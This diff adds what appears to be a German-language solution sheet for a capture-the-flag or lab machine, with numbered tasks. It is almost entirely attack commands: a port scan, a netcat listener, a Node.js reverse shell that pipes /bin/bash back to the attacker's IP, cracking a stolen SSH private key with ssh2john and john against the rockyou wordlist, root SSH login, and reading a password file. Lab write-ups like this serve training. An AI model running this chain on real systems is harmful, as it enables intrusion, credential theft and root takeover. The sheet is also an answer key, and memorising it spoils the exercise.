@@ -1,0 +1,41 @@
+Aufgabe 1
+
+ - nmap -p 100-8100 <target-ip>
+
+
+Aufgabe 4
+ - <ip-target-Maschine>:5173
+Aufgabe 5
+ - nc -lvnp 8081
+
+var net = require("net"), sh = require("child_process").exec("/bin/bash");
+var client = new net.Socket();
+client.connect(8081, "<Your-IP>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
+sh.stderr.pipe(client);});
+
+ - whoami
+
+
+Aufgabe 6
+
+ - ls 
+ - cd
+  
+Aufgabe 7
+
+ - cat id_rsa
+
+ - python ssh2john.py id_rsa > id_rsa.hash
+
+ - wget https://gist.githubusercontent.com/jendruschR/17bd023589cb47b55f3fab205e0c16da/raw/9c681a4427254a530cf8a9d9e07d1baa6c553beb/rockyou.txt
+
+ - john --wordlist=rockyou.txt id_rsa.hash
+
+Aufgabe 8
+
+ - chmod 600 id_rsa
+
+ - ssh -I id_rsa root@<target-ip> -p 187
+Aufgabe 9
+ - ls
+ - cat meowflix_password.txt
